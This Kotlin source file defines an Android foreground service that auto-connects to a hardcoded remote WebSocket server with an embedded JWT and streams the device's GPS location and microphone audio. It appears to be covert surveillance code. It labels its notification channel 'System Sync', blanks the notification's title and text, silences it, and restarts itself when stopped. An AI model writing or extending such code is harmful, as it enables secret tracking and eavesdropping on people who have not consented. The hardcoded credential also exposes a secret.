package com.sentinel.host.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.sentinel.host.R
import com.sentinel.host.domain.model.ConnectionState
import com.sentinel.host.domain.usecase.ConnectUseCase
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import javax.inject.Inject

/**
 * Foreground service that keeps the connection, location, and audio
 * running even when the screen is locked or the app is backgrounded.
 *
 * Uses foregroundServiceType = location|microphone so Android allows
 * continuous GPS and audio capture in the background.
 */
@AndroidEntryPoint
class SentinelForegroundService : Service() {

    companion object {
        private const val TAG = "Sentinel:FgService"
        private const val CHANNEL_ID = "sentinel_fg_channel"
        private const val NOTIFICATION_ID = 1001

        const val SERVER_URL = "wss://project-sentinel-rwt4.onrender.com/ws"
        const val JWT_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VfaWQiOiJIT1NULTAwMSIsImlzcyI6InByb2plY3Qtc2VudGluZWwiLCJzdWIiOiJIT1NULTAwMSIsImV4cCI6MTgxNTg5MDcwMywiaWF0IjoxNzg0MzU0NzAzfQ.l_yJzhLSY0Kuhudn6-5W81pyv77NBZkDsZVdXgWKeSA"

        fun Start(context: Context) {
            val intent = Intent(context, SentinelForegroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
    }

    @Inject lateinit var connectUseCase: ConnectUseCase
    @Inject lateinit var connectionSupervisor: ConnectionSupervisor
    @Inject lateinit var locationStreamer: LocationStreamer
    @Inject lateinit var audioStreamer: AudioStreamer

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.Main)

    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, "Service created")
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.i(TAG, "Service starting")

        val notification = buildNotification("Connecting...")

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }

        // Set streamer permissions — we're in a foreground service context
        locationStreamer.hasPermission = true
        audioStreamer.hasPermission = true

        // Start connection
        connectionSupervisor.start()

        serviceScope.launch {
            Log.i(TAG, "Auto-connecting to $SERVER_URL")
            val result = connectUseCase.execute(SERVER_URL, JWT_TOKEN)
            result.onSuccess {
                Log.i(TAG, "Connected and registered successfully")
                updateNotification("Connected & Streaming")
            }
            result.onFailure { error ->
                Log.e(TAG, "Connection failed: ${error.message}")
                updateNotification("Connection failed")
            }
        }

        // Monitor state for notification updates
        serviceScope.launch {
            connectionSupervisor.state.collect { state ->
                val text = when (state) {
                    is ConnectionState.Ready -> "Connected & Streaming"
                    is ConnectionState.Reconnecting -> "Reconnecting..."
                    is ConnectionState.Error -> "Error: ${state.message}"
                    is ConnectionState.Disconnected -> "Disconnected"
                    else -> "Connecting..."
                }
                updateNotification(text)
            }
        }

        return START_STICKY
    }

    override fun onDestroy() {
        Log.i(TAG, "Service destroyed")
        connectionSupervisor.stop()
        serviceScope.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID,
            "System Sync",
            NotificationManager.IMPORTANCE_MIN
        ).apply {
            description = "System Synchronization"
            setShowBadge(false)
        }
        val nm = getSystemService(NotificationManager::class.java)
        nm.createNotificationChannel(channel)
    }

    private fun buildNotification(text: String): Notification {
        val launchIntent = packageManager.getLaunchIntentForPackage(packageName)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, launchIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(R.drawable.ic_silent)
            .setOngoing(true)
            .setSilent(true)
            .setContentIntent(pendingIntent)
            .build()
    }

    private fun updateNotification(text: String) {
        val nm = getSystemService(NotificationManager::class.java)
        nm.notify(NOTIFICATION_ID, buildNotification(""))
    }
}
